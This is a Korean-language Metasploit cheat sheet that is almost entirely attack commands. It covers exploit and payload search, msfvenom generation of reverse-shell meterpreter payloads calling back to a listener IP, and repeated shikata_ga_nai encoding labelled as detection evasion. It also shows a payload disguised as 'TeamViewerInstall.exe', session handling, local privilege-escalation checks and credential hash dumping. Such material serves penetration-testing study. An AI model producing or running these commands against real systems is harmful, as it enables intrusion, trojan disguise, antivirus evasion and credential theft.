# MSF Components

### 모듈 검색
```msf6 > search <모듈명>```

### 특정 Exploit 모듈 검색
```msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft```

## 특정 Payload 검색
```msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads```

### 특정 Payload 추가 명령 검색
```msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads```

### MSFVenom으로 Payload 생성 (예 : aspx)
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1337 -f aspx > reverse_shell.aspx```

### MSFVenom으로 Payload Encoding (예 : shikata_ga_nai)
```msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai```

### MSF에서 Payload Encoding
```msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders```

### 탐지 우회를 위한 반복 Encoding (약간의 효과)
```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

### 플러그인 추가 설치(예 : pentest)
```
git clone https://github.com/darkoperator/Metasploit-Plugins
cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
msfconsole -q
msf > load pentest
```

### 추가 모듈 로딩 방법(3가지)
- ```msfconsole -m /usr/share/metasploit-framework/modules/```
- ```msf6> loadpath /usr/share/metasploit-framework/modules/```
- ```msf6 > reload_all```

### 인기 있는 플러그인
| [nMap (pre-installed)](https://nmap.org/)                                                                           | [NexPose (pre-installed)](https://sectools.org/tool/nexpose/)                                                                       | [Nessus (pre-installed)](https://www.tenable.com/products/nessus)                                               |
| ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| [Mimikatz (pre-installed V.1)](http://blog.gentilkiwi.com/mimikatz)                                                 | [Stdapi (pre-installed)](https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi) | [Railgun](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation) |
| [Priv](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb) | [Incognito (pre-installed)](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)                                 | [Darkoperator's](https://github.com/darkoperator/Metasploit-Plugins)                                            |

<br/><br/>
# MSF Sessions

### 활성 Session List
```msf6 exploit(windows/smb/psexec_psh) > sessions```

### 활성 Session 사용
```msf6 exploit(windows/smb/psexec_psh) > sessions -i 1```

### 백그라운드 Job으로 실행
```msf6 exploit(multi/handler) > exploit -j```

### 백그라운드 Job List
```msf6 exploit(multi/handler) > jobs -l```

### Meterpreter Session에서 MSF로 잠시 전환
```meterpreter > bg```

### Local Exploit Suggester로 권한 상승 exploit 테스트
```
msf6 > search local exploit suggester
msf6 exploit(multi/handler) > use 2376
msf6 post(multi/recon/local_exploit_suggester) > set session 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

### Meterpreter Session에서 Hash 추출 (SYSTEM 권한일 경우)
```meterpreter > hashdump```<br/>
```meterpreter > lsa_dump_sam```<br/>
```meterpreter > lsa_dump_secrets```
